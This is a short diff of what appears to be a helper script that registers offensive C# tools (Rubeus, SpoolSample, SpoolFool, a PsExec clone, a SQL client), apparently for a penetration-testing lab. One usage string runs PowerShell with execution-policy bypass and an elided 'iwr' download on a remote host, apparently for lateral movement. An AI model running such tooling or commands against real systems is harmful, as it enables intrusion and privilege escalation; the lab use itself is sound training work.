@@ -451,9 +451,9 @@ pandora('cs-3')
 pandora('vb-1')
 
 cs_exe('Rubeus.exe', 'Rubeus')
-cs_exe('../challenges/1/122/SpoolSample.exe', 'SpoolSample')
+cs_exe('SpoolSample.exe', 'SpoolSample', 'SpoolSample.SpoolSample')
 cs_exe('SpoolFool.exe', 'SpoolFool (CVE-2022-21999)')
-cs_exe('../csharp/myPsExec.exe', '[myPsExec.Program]::MainString("appsrv01 SensorDataService powershell -ep bypass -c `"iwr ...`"")', 
+cs_exe('myPsExec.exe', '[myPsExec.Program]::MainString("appsrv01 SensorDataService powershell -ep bypass -c `"iwr ...`"")', 
         'myPsExec.Program', 'Invoke-mPsExec')
 #cs_exe('csexec.exe', '[csexec.Program]::MainString("\\\\<target> cmd") [Failed]')
 cs_exe('SQL.exe', '[SQL.SQL]::Main(@("<servername>", "<sql>")) # separator = `n', 'SQL.SQL')
